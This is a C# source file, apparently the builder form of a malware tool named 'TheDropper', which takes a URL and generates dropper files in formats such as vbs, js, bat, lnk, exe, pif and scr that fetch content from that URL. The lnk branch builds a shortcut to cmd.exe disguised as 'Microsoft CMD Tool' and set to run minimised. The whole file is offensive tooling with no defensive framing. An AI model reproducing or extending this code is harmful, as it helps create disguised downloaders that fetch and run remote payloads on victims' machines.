
using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using IWshRuntimeLibrary;

using TheDropper.Generators;
using TheDropper.Properties;

namespace TheDropper
{
    public partial class Builder : Form
    {
        public Builder()
        {
            InitializeComponent();
            comboBoxExtension.SelectedIndex = 0;
        }

        // Handle button click
        private void buttonBuild_Click(object sender, EventArgs e)
        {
            string file;
            string url = textBoxUrl.Text;
            string ext = comboBoxExtension.Text;

            // Check url
            if (!url.StartsWith("http"))
            {
                MessageBox.Show(this, "Enter A Valid Url", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                textBoxUrl.Focus();
                return;
            }
            // Check extension
            if (string.IsNullOrEmpty(ext))
            {
                MessageBox.Show(this, "Choose Extension Type", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                comboBoxExtension.Focus();
                return;
            }

            // Create generators
            ScriptGenerator sg = new ScriptGenerator(url);
            ExecutableGenerator eg = new ExecutableGenerator(url);

            // Handle
            switch (ext)
            {
                case "vbs": 
                    {
                        file = sg.Generate(Resources.vbs_payload, "vbs");
                        break;
                    }
                case "js":
                    {
                        file = sg.Generate(Resources.js_payload, "js");
                        break;
                    }
                case "bat":
                    {
                        file = sg.Generate(Resources.batch_payload, "bat");
                        break;
                    }
                case "cmd":
                    {
                        file = sg.Generate(Resources.batch_payload, "cmd");
                        break;
                    }
                case "lnk":
                    {
                        Uri uri = new Uri(url);
                        string payload = string.Format(Resources.lnk_payload, uri.AbsoluteUri, Path.GetFileName(uri.LocalPath), Path.GetFileName(uri.LocalPath));
                        WshShell shell = new WshShell();
                        IWshShortcut sc = (IWshShortcut)shell.CreateShortcut("output.lnk");
                        sc.Description = "Microsoft CMD Tool";
                        sc.TargetPath = "%SystemRoot%\\System32\\cmd.exe";
                        sc.Arguments = payload;
                        sc.WindowStyle = 7;
                        sc.Save();
                        file = "output.lnk";
                        break;
                    }
                case "exe":
                    {
                        file = eg.Generate("exe");
                        break;
                    }
                case "com":
                    {
                        file = eg.Generate("com");
                        break;
                    }
                case "pif":
                    {
                        file = eg.Generate("pif");
                        break;
                    }
                case "scr":
                    {
                        file = eg.Generate("scr");
                        break;
                    }
                default:
                    {
                        MessageBox.Show(this, "Unknown extension", "Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        return;
                    }
            }

            // Ok message
            if (System.IO.File.Exists(file))
            {
               
                MessageBox.Show(this, "File Saved: " + file, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Close();
                
               
                
                
            }
        }

        
        
    }
}
